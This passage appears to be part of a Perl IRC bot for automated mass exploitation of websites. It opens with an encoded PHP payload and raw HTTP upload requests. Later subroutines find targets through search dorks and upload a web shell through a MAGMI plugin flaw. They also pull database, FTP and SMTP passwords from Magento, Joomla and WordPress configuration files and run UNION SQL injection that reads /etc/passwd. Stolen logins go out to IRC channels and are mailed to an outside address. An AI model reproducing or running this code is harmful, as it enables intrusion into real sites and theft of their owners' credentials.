WtPq6zDXVJT+aDPzBhLHuhMEA0ZOZZxRalfZVkLSZtKRo1SOVybDLiVD+aVf5XY2I2HYIfsinUInmuzpWK6LnKKBbNwot7HMen0EGrb7hZC1INlYYvy8G3Njoak4eectFuFEOIkKgtqQSbYQlenB7KGZtiMcXLYpCYXRd15YGLUSyPIMRYD7fnZAcpSit2JJ9tN7xlJpzyozvGh6ShxNZCWGtypYM8orlQ2kmWJnS+iyhkTIrhpon7AAvWO4Gy2revbNp3bG6cFttMMjlcmosay1TSba64MuRUkyyIFSBUVckS+M++j5OMtkNTTKtMaKnCfKsu4M460CvksAsQUYjo6HBebkpclLyeT8+J8hNWKWIli07UJ7xxzLmJ7HlJb8vLbsa4DtIfKeQF5KvrHNXn3AmDJvzWXsvQrPAuyOTfigSPKMHY38u6zJkk4mEaQv0x4qnyfrcCkjCgvtnC/AD+iL3c54T8gMfrY9U905hPSvgRnbOA17ZWU5r8iMVsDeWCGmPQins6hJNj2KSOu0nNqxCpDkK8Gt4BVzCK1sN5LNHA58r6QukGfCXY5D+ppJvZICPrU/zPfBq4GRswC+Svw/f6aEc8q4QOqSoUQg/icGQiH8rJQB+KWcLZdOxUQF/5yasEVk44EIgNRKtSpY52hi0J0bCW4vB9rB+yc9zzfPtYnKIIppJJDG+LtOcIvoW5CJ+JJIYv4B/y50QXAzrTIG8dgnGMwb+QUdJhCFYmezzikF3M0Txsb4alMUJpFcovsV4lNxFm5qG1jfr87cGsdqBfo3sGR0Bf+F71JrOcmFXUcuZxGbQvj+dFWsEPPXAxwxOSsbCgC7opzThxL7Fc5MGe8LRMJ6I7JfOAGGBf5X+o3QUyvN3C5S7z5s4pmfUAD07yGEshswONfLiuTNcJ5Tbvg3t0X4Z65b1UHOSmlmGz5jYbBf8yTYygvjh/Uz5fBj40zulqssXZo0pbjkOuzHrc65I1jeO49yti3de/EW4B9+6LPZ1BUIl2zuIJWaVKs/KhvV9Xi7T5ly8r2YWZ2Afw5a+je2ppS+URgM9J5cv3GRGVcxe20bzSXP0zp/hvsi3gM6L/nk0OneLd/YyOisRmVr0fHK97W4u/AzesEGL5pgfy8eH405+eUnPAjQh5iTKvABjWO+0mVfMgY8QK2v4bc3PlvFeBjzfTryVW+iZZFPOIe4/Mw/EF/POoozjFlwZX6HzZhCzrC+ttfZZ1Dleph/EX0NuxsP53W4+7jBUmcvBmttNQ8agwRNvjSnHU+cwe50y3uoE5b7OTjcOtJ8+i9LGaFZKwHTJIEpXwaYVz/X34+r66fPbfGL55gX6UocfIj1k0A8NBGmyadHPnZS/84B+gOC9vWjjJH6GGz1/3vhKCl4z9Mrv+CdeSW5v4x+cMvTYfn3z3rLNlXI/w79fgFskW2f3fhWhnyBO/X680l/gHzW6z9ZhAlqhxY+NdyR8w/RKZGQDD4HG2tZ+DKEsIB4C0TmFNgFrwswXbrG5eVOjOSze6xYHXW1JE3oCHQ4KthNVnFWT4jY2OjhBERubIXAz7C7HFA8BreOPm9wGHdYz8xZuD6eLsfRzbgZ6YCYkY6FjcPWTT4DDo2k/F6CHhBXGBtCl1tAhYZscBNyQ2LjoOvsH7t8zMZCmxXP6CpI4Q6SstgHDO9ocxndpffSDAuNDXgN6G3DehcAZktPhcYMOb8yb8J3JQG5833dBQLnbsYENSzd+sAblqdewepo9srYB21ZHsbuyhgIE6ehuID+05uCom4sU0T5hOokx5DI1Yi+LAnH7dc6Powt6jHOn68oNsZN1IYuvj1zcP8RXa8BReSutG0tGpaRCyvs796PoPi+PgADZdjm+7q5jf644QNEpD3+FGiSnKrVrKOPe5/P/eNMICZRH08GdqsiAbDCyIm1ro1LqQIdOkRlX8owQ5lA8l9vwfQv8hHFkYe3GFc8hCABeH9F7Fz4pXmMbM0MfeLPUkMMD2mGbFm2A/nb1+el6kkoGUD+rWjzG5+tlj9w8sT4fa/8BO3FFtGLNOeCthB6uVi0lxrwHXqeo2GAWOLwvbELpityEeCUOISgB+Zzo2JPqjVeBrNG8/eSyzaLIVXjKO/SwDcKXIbZiIG7IWgbhil7qjGdPZufFt5OH5qOHTM9g4Cn14+nWUEu0/AW68K3sFAS3njZfpOhUNcbu6hFbhXpOrj1zCz6mWs1eYFzPuaCO65H7MXCWZ+4PAcn4oNx+E98/BPRcExXvtzGK/2C8YyT6S2JBDpqHFn6o5in1v5PM8qexAad4+RPb4Z3OyLFOt/fxldWEtrXDUnBy8KT+8FZ84fAIcCjGehkhxExmfgMYTXdfEt/2Yr4Rzd+1/T3F1UOQp5/v9/qtYqKn5+zfUp0++PfTPPWrx8iAgbtipP81/3+S235trJIY38q+1m+tv6b9Ovh1cOinNvBpv0z2BfWRp8piH5FCoOEfP22IjafUn2Kwru/CvtXo/UO8bNkuPBZGnuL2Rtp+eRz6RGZ8RTzaMpuCYoj7+uPhAZnvuR4wrNb1544/97z+i+T/1YNcj9Yq/zxsf43/32q8uV/HnzPPr9mUVHriTnT/IvHlAV/fUl3yLL3G0MrGV+1uqB7pPKk8vunavoNr8mBG/yr1ybOyONl4+Uf+v2vqOOLR/PhHU9VugI+INc/x4pPmuhiXlmYsd4c7lMv70LUfKzjUJQ/XvvNrsH6QwU1N+CDDF+ytK9+Ezr9VPn+8pu8gLqwfCvqofeqvHp8/De//nGz6kY1sLD481uG/xL71pTX9meuPaGz99eLEI93/zvaxL9H+fdcdL+DtzxkvHunzh2+/I2w9GvN90FM+qPn9jG++u93N2/2hVnwiZHqbXv4ppya39XCT2/PnJrfVwcnt8cnJ7bmjk9vD2cntyeHJ7fNmr+wqX6FJvbPLDCz8Aq7yc2DhNz6WL8mL1va7VN4ea/UyU2IFhQXb5jM0En5UXvFXskqo79XRi+qO31AZHFVLlTQcYXwuCatCosEyKhIs9KJHLDz8nsKCn/Gzq5cvX8GXe2qRrmj0vjj8d8vnFWjQrf4OzsZ0kHztx42ffP36EtXFiOUrGX81gSr76BVkNyeDZm2u+7rTON8Ev1KO5fu3dGF0DkDqHT8Q2UHjkQlT6a+vKjJele9P/H/v/v63XxHGG8Jg/PZXHN4Ks540eLC9W/6qMRQG9Nur8n2oTJa9vF+t0+DlbQUwBFJkf2VQeBXasaujN6q+EgMQUB6/sux7PfWTSsb7w/2Fe4/eVIemAoagt9Mai4K8q/8l8D9nG91r9/8B')))); ?> ";

$header17 = 'Content-Disposition: form-data; name="upload-name"'; 

$header18 = 'bogel'; 

$header19 = 'Content-Disposition: form-data; name="action"'; 

$header20 = 'upload'; 

$header21 = "-----------------------------41184676334--"; 

$header22 = 'X-Request: JSON'; 

$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8'; 

$header25 = 'json={"fn":"folderRename","args":["/bogel.gif","../../tmp/bogel.php.1"]}'; 

$header24 = "Content-Length: ".length($header25)."";

my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host" ,PeerPort=>"80") || return;

print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n";

my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host" ,PeerPort=>"80") || return;

print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";

while ($hasil = <$remote>) {

if ($hasil =~ /200 OK/) {

$success = 1;

}

return $success;

}

}

##

sub magmi_exploit() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

	my $nick = $_[4];

    my $count = 0;

    my @list = &search_engine($chan,$bug,$dork,$engine,$magslogo,$nick);

    my $num = scalar(@list);

    if ($num > 0) {

        foreach my $site (@list) {

            $count++;

            if ($count == $num-1) { &msg("$chan"," 14 I'm Done in 15,1[15@4$engine15]"); }

            my $test = "http://".$site.$bug; 

			my $coba = "http://".$site."/app/etc/local.xml"; 

				my $html = &get_content($test);

				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

				if ($html =~ /MAGMI/ || $html =~ m/<h3>Upload New Plugins<\/h3>/i ) {

			    &msg("$chan","15,1[15@4$engine15]11 Executing Payloads...");

				&magmi_xpl($test,$chan,$site,$engine,$nick);

				&magmi_sql($test,$chan,$site,$engine,$nick);

				#&ssh_connect($test,$host,$user,$pass,$chan,$engine,$nick);sleep(1);

				#&bogex2($coba,$chan,$site,$engine,$nick);

				} else { }

            } exit; sleep(2); }

        }

    }

}



sub magmi_xpl() {

#my $ua = LWP::UserAgent->new;

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

   $ua->timeout(7);

   $ua->agent($uagent); 

my $url    = $_[0];

my $chan   = $_[1];

my $site   = $_[2];

my $engine = $_[3];

my $nick   = $_[4];

my $action 		= "http://".$site."magmi/web/magmi.php";

my $update_file = "revslider.zip";

my $exploit 	= $ua->post("$url", Content_Type => "multipart/form-data", Content => [action => "$action", plugin_package => ["$update_file"]]);

	my $status  = $exploit->as_string;

	my $sukses	= "http://".$site."magmi/plugins/revslider/.libs.php";

	my $check = &get_content($sukses."?bajak");

	if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

	my $safe = ""; 

	my $os   = ""; 

	my $uid  = "";

	if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

	if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

	if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

	&msg("$chan","$magslogo(12@12$engine12)2(2@2SHeLL)12 $safe $os 2(2@2SixNergy Inc2) ");sleep(2);

	&msg("$admin","$magslogo [12@12$engine12]2[2@2SHeLL2]12 http://".$site."magmi/plugins/revslider/.libs.php Inc2");sleep(2);

	&msg("$nick","$magslogo [12@12$engine12]2[2@2SHeLL2]12 http://".$site."magmi/plugins/revslider/myluph.php Inc2");sleep(2);

	}

}



sub magmi_sql() {

my $url    = $_[0];

my $chan   = $_[1];

my $site   = $_[2];

my $engine = $_[3];

my $nick   = $_[4];

my $html   = &get_content($url);

my $test   = "http://".$site."/app/etc/local.xml";

			my $check = &get_content($test); 

			if ($check =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/i) { 

			my $serverIP = ""; 

			if ($check =~ /<host><!\[\CDATA\[(.*)\]\]\><\/host>/) {$serverIP=$1;} 

			if ($check =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/){$user=$1;} 

			if ($check =~ /<password><!\[CDATA\[(.*)\]\]\><\/password>/){$pass=$1;} 

			if ($check =~ /<dbname><!\[CDATA\[(.*)\]\]\><\/dbname>/){$dbname=$1;} 

			if ($check =~ /dbname/i) {

			&bogex2($test,$chan,$site,$engine,$nick);

			&msg("$chan","$magslogo15,1[4@15$engine15] Entot!7:9 http://".$site."[+]username:".$user."[+]password:".$pass."[+]dbname:".$dbname."");

						#   &msg("$chan","$magslogo(12@2$engine12)12http://".$site." 2[+]username:12".$user."");

						  # &msg("$chan","$magslogo(12@2$engine12)12http://".$site." 2[+]password:12".$pass.""); 

						#   &msg("$chan","$magslogo(12@2$engine12)12http://".$site." 2[+]dbname  :12".$dbname."");

                           if ($user =~ /_/) {

						   @users = split("_", $user); $usr = $users[0];}

                           my $ceklog = "ftp://".$usr.":".$pass."@".$site."";

                           my $ceklog2 = "ftp://".$user.":".$pass."@".$site."";

                           my $ftplog = &get_content($ceklog);

                           my $ftplog2 = &get_content($ceklog2);

                           if ($ftplog =~ /ftp/) {

                           &msg("$admin","9[+]$magslogo FTP[+] 11ftp://".$site." [+]username:".$usr." [+]password:".$pass."");

                          # &msg("$chan","9[+]$$mg2logo2$engine 12FTP[+]Success send To Admin");

                           }

                           if ($ftplog2 =~ /ftp/) {

                           &msg("$admin","9[+]$magslogo 11FTP[+] 11ftp://".$site." [+]username:".$user." [+]password:".$pass."");

                         #  &msg("$chan","9[+]$$mg2logo2$engine 12FTP[+]Success send To Admin");

							}

							my $hosts = "http://".$site;

							if($hosts =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {

								$host = $2;

									#&dbi_connect($host,$user,$pass,$dbname,$chan,$engine,$mg2logo);sleep(1);

									&msg("$chan","!ftp ".$host." ".$user." ".$pass."");

										if ($dbname =~ /_/) {

										@users = split("_",$dbname); $dbuser = $users[0]; }

										&ftp_connect($url,$host,$dbuser,$pass,$chan,$engine,$magslogo);sleep(1);

										#&msg("$chan","!ftp ".$host." ".$dbuser." ".$pass."");

			}   

		}

	}

}



sub cckjseblod() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$cckjlogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

		foreach my $site(@list){

		$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

		my $target = "http://".$site.$bug;

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

		my $check = &get_content($target);

		if ($check =~ /class JConfig/) {

		my ($host,$user,$pass);

		$target =~ s/http:\/\///;

		$target =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

		if ($check =~ m/\$ftp_host = '(.+?)';/i){$host=$1;}

		if ($check =~ m/\$ftp_user = '(.+?)';/i){$user=$1;}

		if ($check =~ m/\$ftp_pass = '(.+?)';/i){$pass=$1;}

		if ($check =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}

		if ($check =~ m/\$smtpport = '(.+?)';/i){$smtpport=$1;}

 		if ($check =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}

		if ($check =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}

		if ($check =~ m/\$password = '(.+?)';/i){$password=$1;}

		if ($host =~ /127.0.0.1/) { $host = $target}

		&msg("$chan","$cckjlogo15,1[15@4$engine15]4 Host:3 $host 4| 4User:3 $user 4| 4Pass:3 $pass 15][ 4SmtpHost:8 $smtphost 4| 4SmtpPort:8 $smtpport 4| 4SmtpUser:8 $smtpuser 4| 4SmtpPass:8 $smtppass | 4Cadangan:15 $password ");

		if ($user =~ /_/) { my @userz = split("_", $user); $user = $userz[0];}

		my $success = 1;

		use Net::FTP;

		eval {

		my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 6);

		$success = 0 if $ftp->login($user,$pass);

		$ftp->quit;

		};

		if ($success == 0) {

			&msg("$chanx","$cckjlogo15,1[15@4$engine15]14 FTP4 3ftp://".$host." 4| 4User:3 $user 4| 4Pass:3 $pass 15]9 FVCKED!");

			&msg("$nick","$cckjlogo15,1[15@4$engine15]14 FTP4 3ftp://".$host." 4| 4User:3 $user 4| 4Pass:3 $pass 15]9 FVCKED!");

			#&msg("$chan","$cckjlogo15,1[15@4$engine15][8 Status Login cPanel 9OK! 15-8 Result Sent to 9ADMIN 15] ");

		}

		 else {

			#&msg("$chan","15,1 [9FTP15] [ 9ftp://".$host." 15] [".$user." : ".$pass."15] 4Denied ");

		 }

		}

	} exit;

}

		}

	}

}

	

sub sql_exploit() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $nick = $_[4];

	my $count = 0;

    my @list = &search_engine($chan,$bug,$dork,$engine,$sqllogo,$nick);

    my $num = scalar(@list);

    if ($num > 0) {

        foreach my $site (@list) {

            $count++;

            if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

            my $test = "http://".$site.$bug."'";

            my $vuln = "http://".$site."4".$bug;

			my $sqlsite = "http://".$site.$bug;

            my $html = &get_content($test);

			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

            if ($html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {

                &sqlbrute($sqlsite,$chan,$engine,$nick);}

            elsif ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {

                &msg("$chan","$sqllogo 15,1 $engine 15(4@9MsSQL15) 14 ".$vuln);}

            elsif ($html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i || $html =~ m/Microsoft OLE DB Provider for Oracle/i ) {

                &msg("$chan","$sqllogo 15,1 $engine 15(4@9MsAccess15) 14 ".$vuln);}

            elsif ($html =~ m/mysql_/i || $html =~ m/Division by zero in/i || $html =~ m/mysql_fetch_array/i ) {

                &sqlbrute($sqlsite,$chan,$engine,$nick);}

            } exit; sleep(2); }

        }

    }

}

sub sqlbrute() {

	my $situs=$_[0];

	my $chan  =$_[1];

	my $engine=$_[2];

	my $nick = $_[3];

	my $columns=20;

	my $cfin.="--";

	my $cmn.= "+";

	for ($column = 0 ; $column < $columns ; $column ++)

	{

	$union.=','.$column;

	$inyection.=','."0x6c6f67696e70776e7a";

    if ($column == 0)

      {

		  $inyection = '';

          $union = '';

      }

    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;

    $response=get($sql);

    if($response =~ /loginpwnz/)

		{

         $column ++;

         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;

		 &msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15) 14 $sql ");

         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;

         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");

         if($response =~ /loginpwnz/)

         	{

         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;

			&msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15)(4@13INFO_SCHEMA15) 14 $sql ");

         	}

         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;

         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");

         if($response =~ /loginpwnz/)

         	{

         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;

			&msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15)(4@9USER15) 14 $sql ");

         	}

         else

         	{

         	}

	while ($loadcont < $column-1)

	   {

		$loadfile.=','.'load_file(0x2f6574632f706173737764)';

		$loadcont++;

	   }

	   $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;

	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");

         if($response =~ /root:x:/)

         	{

			&msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15)(4@9Load File15) 14 $sql ");

			}

         else

         	{

         	}

	          foreach $tabla(@tabele)

                {

                  chomp($tabla);

                  $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;

				 $response=get($sql)or die("[-] Impossible to get tables\n");

                  if($response =~ /loginpwnz/)

                    {

                    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;

					&msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15) (4@9Tabel15) 14 $sql ");

					&tabelka($situs,$tabla,$chan,$engine,$nick);

                    }

                }

	    }

	}			

}



sub tabelka() {

			my $situs =$_[0];

			my $tabla =$_[1];

			my $chan  =$_[2];

			my $engine=$_[3];

			my $nick=$_[4];

			my $cfin.="--";

			my $cmn.= "+";

            chomp($tabla);

            foreach $columna(@kolumny)

            {

             chomp($columna);

             $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;

             $response=get($sql)or die("[-] Impossible to get columns\n");

             if ($response =~ /loginpwnz/)

                {

				&msg("$chan","$sqllogo 15,1 $engine 15(4@9SQL15) (4@9SQLi Vuln15) 9 $situs 14(4@13Kolom14)13 $columna 14(4@9Tabel14)13 $tabla ");

                }

            }

        

}	

	

sub char() {

my $str = $_[0];

my @strs = split(//,$str);

my @list;

foreach my $string(@strs){

my $hex = unpack("C*",$string);

$hex .= ",";

push (@list,$hex);

}

my $res = "CHAR(".join(" ",@list).")";

$res =~ s/,\)$/\)/;

$res =~ s/ //g;

return $res;

}



sub ftp_connect (){

	my $url = $_[0];

	my $host = $_[1];

	my $user = $_[2];

	my $pass = $_[3];

	my $chan = $_[4];

	my $engine = $_[5];

	my $logo = $_[6];

	my $success = 1;

	use Net::FTP;

	eval {

	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 7);

		$success = 0 if $ftp->login($user,$pass);

		$ftp->quit;

		};

		if ($success == 0) {

		&msg("$chanx","15[4 $engine 15] 9http://".$host." |7 ".$user.":".$pass." 9| $logo");sleep(2);

	}

}





sub bogex() { 

 	my $url    = $_[0]; 

 	my $chan   = $_[1];

 	my $site   = $_[2];

 	my $engine = $_[3];

	my $logo   = $_[4];

	my $data   = &get_content($url);

	my $psite  = "http://".$site;

	if ($psite =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $host = $2; }

    if ($data =~ m/smtphost/g && $data =~ m/smtppass/g || $data =~ m/ftp_host/g ) {

	if ($data =~ m/smtphost(.+?)\'(.*)\'/g) { $smtph = $2; }

	if ($data =~ m/smtpport(.+?)\'(.*)\'/g) { $smtpp = $2; }

	if ($data =~ m/smtpuser(.+?)\'(.*)\'/g) { $smtpu = $2; }

	if ($data =~ m/smtppass(.+?)\'(.*)\'/g) { $smtps = $2; }

	if ($data =~ m/ftp_host(.+?)\'(.*)\'/g) { $ftph = $2; }

	if ($data =~ m/ftp_port(.+?)\'(.*)\'/g) { $ftpp = $2; }

	if ($data =~ m/ftp_user(.+?)\'(.*)\'/g) { $ftpu = $2; }

	if ($data =~ m/ftp_pass(.+?)\'(.*)\'/g) { $ftps = $2; }

	if ($data =~ m/var \$user(.+?)\'(.*)\'/g) { $cfuser = $2; }

	if ($data =~ m/var \$user(.+?)\'(.*)_(.*)\'/g ) { $cfuserx = $2; }

	if ($data =~ m/password(.+?)\'(.*)\'/g) { $cfpass = $2; }

	&msg("$chanx","$ftplogo15,1[6DB15]3 $host 15,1[4 $smtph 4:4 $smtpp 4|3 $smtpu 4:3 $smtps 15][4 $ftph 4:4 $ftpp 4|3 $ftpu 4:3 $ftps 15][7 $cfuser 4:7 $cfpass 15]"); sleep(2);

	&bogelftp($host,$ftpu,$ftps,$chan,$engine); 

	} 

}



sub bogelftp() {

	my $host = $_[0];

	my $user = $_[1];

	my $pass = $_[2];

	my $chan = $_[3];

	my $engine = $_[4];

	my $logo = $_[5];

	my $success = 1;

	use Net::FTP;

	eval {

	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);

	$success = 0 if $ftp->login($user,$pass);

	$ftp->quit;

	};

	if ($success == 0) {

	&msg("$admin","$logo15,1[15@4FTP15][3 http://".$host." 15][3 ".$user." 4:3 ".$pass." 15] 9FUCKED");

	#&msg("#coi","$logo15,1[15@4$engine15][8 Status Login FTP 9OK! 15-8 Result Sent to 4*9 ADMIN 4* 15] ");

$mailtype = "content-type: text/html";

$sendmail = '/usr/sbin/sendmail';

$sender = "myluph\@blackunix.us";

$subject = "myluph - Cpanel info :";

$mailto = "sabuncuci88\@gmail.com";

open (SENDMAIL, "| $sendmail -t");

print SENDMAIL "$mailtype\n";

print SENDMAIL "Subject: $subject\n";

print SENDMAIL "From: $sender\n";

print SENDMAIL "To: $mailto\n\n";

print SENDMAIL "Setoran FTP or cPaneL -> Host: $host Login: $user Pass: $pass \n\n";

close (SENDMAIL);

#print "mail has been target Sent to $mailto\n";

	}

}



sub smtp() {

 	my $url    = $_[0]; 

 	my $chan   = $_[1];

 	my $site   = $_[2];

 	my $engine = $_[3];

	my $logo   = $_[4];

	my $check = &get_content($url);

	if ($check =~ m/\$smtpauth = '1';/i) { 

 	my $smtpauth = "";

	my $smtphost = "";

 	my $smtpuser = "";

 	my $smtppass = "";

	if ($check =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}

	if ($check =~ m/\$smtpport = '(.+?)';/i){$smtpport=$1;}

 	if ($check =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}

	if ($check =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}

	&msg("$admin","$logo15,1[15@4SMTP15]4 $site14 -11 $smtphost 14|11 $smtpport 14|11 $smtpuser 14|11 $smtppass ");

	#&msg("$chan","$logo15,1[15@4SMTP15][8 Status SMTP 9OK! 4-8 Result Sent to 4*9 ADMIN 4* 15] ");

$mailtype = "content-type: text/html";

$sendmail = '/usr/sbin/sendmail';

$sender = "myluph\@blackunix.us";

$subject = "myluph - SMTP INFO :";

$mailto = "sabuncuci88\@gmail.com";

open (SENDMAIL, "| $sendmail -t");

print SENDMAIL "$mailtype\n";

print SENDMAIL "Subject: $subject\n";

print SENDMAIL "From: $sender\n";

print SENDMAIL "To: $mailto\n\n";

print SENDMAIL "Setoran SMTP -> Host: $smtphost - Port: $smtpport - Login: $smtpuser - Pass: $smtppass \n\n";

close (SENDMAIL);

#print "mail has been target Sent to $mailto\n";

	}

}



sub bogex2() {

     my $url    = $_[0];

     my $chan   = $_[1];

     my $site   = $_[2];

     my $request   = HTTP::Request->new(GET=>$url);

     my $browser   = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'});

        $browser->timeout(10);

		$browser->agent($uagent);

        my $response  = $browser->request($request);

        if ($response->is_success) {

 	my $res   = $response->as_string;

	if ($res =~ m/'DB_HOST', '(.*)'/g) {

	$userpass = getpassx($res);

	&msg("$chan","$DBlogo15,1[15@4DB15] [7 http://".$site." 15][3 $userpass 15]"); 

 	@index = ('phpmyadmin/','phpMyAdmin/');

	foreach $scan(@index){

	$urlx = "http://".$site.$scan;

	$request = HTTP::Request->new(GET=>$urlx);

	$useragent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'});

	$response = $useragent->request($request);

	if ($response->is_success && $response->content =~ /Admin Area/ || $response->content =~ /Password/ || $response->content =~ /welcome/ || $response->content =~ /passwd/ || $response->content =~ /username/) { 

	&msg("$chan","15,1[15@4phpMyAdmin15][4 $urlx 15,1[3 $userpass 15]"); 

		} sleep(1);

	}

	my $lulz = "http://".$site;

	my $user = "";

	my $pass = "";

	if($lulz =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {

	my $host = $2;

	my @ftpu = split(":xXx:", $userpass);

	$user = $ftpu[0];

	$pass = $ftpu[1];

	my $ftpstat = "";

	if($user =~ /_/) { @userz = split("_", $user); $user = $userz[0];}

	bogelftp2($res,$host,$user,$pass,$chan,$engine);

	} sleep(3); 

		}

	}

}



sub getpassx() {

	my $string = $_[0];

	my @bogel = split("\r\n", $string);

	my $pass = "";

	my $user = "";

	foreach my $line (@bogel) {

		if(($line =~ m/'DB_PASSWORD', '(.*)'/i) or ($line =~ /<password><!\[CDATA\[(.*)\]\]\><\/password>/)) {

			$pass = $1;

		} 

		if(($line =~ m/'DB_USER', '(.*)'/i) or ($line =~ /<username><!\[CDATA\[(.*)\]\]\><\/username>/)) {

			$user = $1;

		}

	}

	return $user." : ".$pass;

}



sub bogelftp2() {

	my $url = $_[0];

	my $host = $_[1];

	my $user = $_[2];

	my $pass = $_[3];

	my $chan = $_[4];

	my $engine = $_[5];

	my $logo = $_[6];

	my $success = 1;

	use Net::FTP;

	eval {

	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 2);

	$success = 0 if $ftp->login($user,$pass);

	$ftp->quit;

	};

	if ($success == 0) {

	&msg("$admin","$logo15,1[15@4FTP15][3 http://".$host." 15][3 ".$user." 4:3 ".$pass." 15] 9FUCKED");

$mailtype = "content-type: text/html";

$sendmail = '/usr/sbin/sendmail';

$sender = "myluph\@blackunix.us";

$subject = "myluph - Cpanel info :";

$mailto = "sabuncuci88\@gmail.com";

open (SENDMAIL, "| $sendmail -t");

print SENDMAIL "$mailtype\n";

print SENDMAIL "Subject: $subject\n";

print SENDMAIL "From: $sender\n";

print SENDMAIL "To: $mailto\n\n";

print SENDMAIL "Wordpress Setoran FTP or cPaneL -> Host: $host Login: $user Pass: $pass \n\n";

close (SENDMAIL);

#print "mail has been Sent to $mailto\n";

	}

}



#########################################       Searching site...

 

sub search_engine() {

    my (@list,@clean);

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $logo = $_[4];

	if ($engine eq "aanK") { my @aank = &jack21($dork); push(@list,@aank);sleep(3); }

    if ($engine eq "coi") { my @coi = &jack22($dork); push(@list,@coi);sleep(3); }

    if ($engine eq "roin") { my @roin = &jack23($dork); push(@list,@roin);sleep(3); }

    if ($engine eq "Keren") { my @keren = &jack24($dork); push(@list,@keren);sleep(3);}

    if ($engine eq "Beken") { my @beken = &jack25($dork); push(@list,@beken);sleep(3);}

    if ($engine eq "kangkung") { my @kangkung = &jack26($dork); push(@list,@kangkung);sleep(3);}

    if ($engine eq "successor") { my @successor = &jack27($dork); push(@list,@successor);sleep(3);}

    if ($engine eq "Brewok") { my @brewok = &jack28($dork); push(@list,@brewok);sleep(3);}

    if ($engine eq "Marlboro") { my @marlboro = &jack29($dork); push(@list,@marlboro);sleep(3);}

    if ($engine eq "Prince") { my @prince = &jack30($dork); push(@list,@prince);sleep(3);}

